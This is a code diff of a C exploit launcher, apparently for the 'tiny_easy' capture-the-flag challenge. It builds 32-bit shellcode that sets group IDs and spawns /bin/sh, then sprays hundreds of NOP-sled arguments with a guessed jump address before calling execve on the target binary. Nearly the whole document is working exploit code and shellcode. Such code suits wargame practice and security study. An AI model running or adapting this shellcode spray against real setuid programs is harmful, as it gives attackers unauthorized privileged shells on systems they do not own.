@@ -61,42 +61,55 @@ gcc -m32 -fno-stack-protector -no-pie -Wl,-z,relro,-z,now te.c
 #include <stdlib.h>
 #include <unistd.h>
 
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
 #define N_COPIES 512
 #define PACKAGE_SIZE 4096
 int main() {
         int i, j, k, ec;
         char* args[N_COPIES];
         char* env[2];
-        const char payload[] = "\x6a\x32\x58\x0f\x05\x89\xc3\x89\xc1\x6a\x46\x58\x0f\x05\x8d\x1c\x24\x31\xc9\x31\xd2\x0f\x05";
-        const char guess_addr[] = "\xc4\xa7\xac\xff";
+        const char strpayload[] = "/bin/sh";
+        const char shellcode[] = "\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x6a\x0b\x58\x8b\x5c\x24\x04\x31\xc9\x31\xd2\xcd\x80";        const char guess_addr[] = "\xc4\xa7\xac\xff";
 
         env[0] = "ENV=ENV";
         env[1] = NULL;
 
-        printf("sizeof(payload) = %u | sizeof(guess_addr) = %u\n", sizeof(payload), sizeof(guess_addr));
+        printf("sizeof(shellcode) = %u | sizeof(guess_addr) = %u\n", sizeof(shellcode), sizeof(guess_addr));
 
-        // first argument: pass the jump address
+        // argv[0]: jump address
         args[0] = (char*)(malloc(PACKAGE_SIZE));
         for (i = 0; i < sizeof(guess_addr); i++) args[0][i] = guess_addr[i];
         for (; i < PACKAGE_SIZE; i++) args[0][i] = '\x90';
         args[0][i] = '\x00';
 
-        // args 2-4095: pass a package (NOPs + payload)
-        for (i = 1; i < N_COPIES - 1; i++) {
+        // argv[1]: string payload
+        args[1] = (char*)(malloc(sizeof(strpayload)));
+        for (i = 0; i < sizeof(strpayload); i++) args[1][i] = strpayload[i];
+
+        // argv[2]: null string
+        args[2] = (char*)(malloc(64));
+        for (i = 0; i < 64; i++) args[2][i] = '\x00';
+
+        // argv[3:N_COPIES - 2]: pass a package (NOPs + shellcode)
+        for (i = 3; i < N_COPIES - 1; i++) {
                 args[i] = (char*)(malloc(PACKAGE_SIZE));
-                for (j = 0; j < (PACKAGE_SIZE - sizeof(payload)); j++) args[i][j] = '\x90'; // x86 NOP
-                for (k = 0; k < sizeof(payload); j++, k++) args[i][j] = payload[k];
+                for (j = 0; j < (PACKAGE_SIZE - sizeof(shellcode)); j++) args[i][j] = '\x90';  // x86 NOP
+                for (k = 0; k < sizeof(shellcode); j++, k++) args[i][j] = shellcode[k];
         }
 
-        // arg 4096: nullptr
-        args[++i] = NULL;
+        // argv[N_COPIES - 1]: nullptr
+        args[i] = NULL;
 
         /*
-        printf("args[1] = ... \n");
-        for (i = 0; i < PACKAGE_SIZE; i += 32) {
-                printf("0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx\n", args[1][i], args[1][i+1], args[1][i+2], args[1][i+3], args[1][i+4], args[1][i+5], args[1][i+6], args[1][i+7], args[1][i+8], args[1][i+9], args[1][i+10], args[1][i+11], args[1][i+12], args[1][i+13], args[1][i+14], args[1][i+15], args[1][i+16], args[1][i+17], args[1][i+18], args[1][i+19], args[1][i+20], args[1][i+21], args[1][i+22], args[1][i+23], args[1][i+24], args[1][i+25], args[1][i+26], args[1][i+27], args[1][i+28], args[1][i+29], args[1][i+30], args[1][i+31]);
-        }
-        */
+           printf("args[1] = ... \n");
+           for (i = 0; i < PACKAGE_SIZE; i += 32) {
+           printf("0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx\n", args[1][i], args[1][i+1], args[1][i+2], args[1][i+3], args[1][i+4], args[1][i+5], args[1][i+6], args[1][i+7], args[1][i+8], args[1][i+9], args[1][i+10], args[1][i+11], args[1][i+12], args[1][i+13], args[1][i+14], args[1][i+15], args[1][i+16], args[1][i+17], args[1][i+18], args[1][i+19], args[1][i+20], args[1][i+21], args[1][i+22], args[1][i+23], args[1][i+24], args[1][i+25], args[1][i+26], args[1][i+27], args[1][i+28], args[1][i+29], args[1][i+30], args[1][i+31]);
+           }
+           */
 
         ec = execve("/home/tiny_easy/tiny_easy", args, env);
         if (ec) perror("execve error: ");
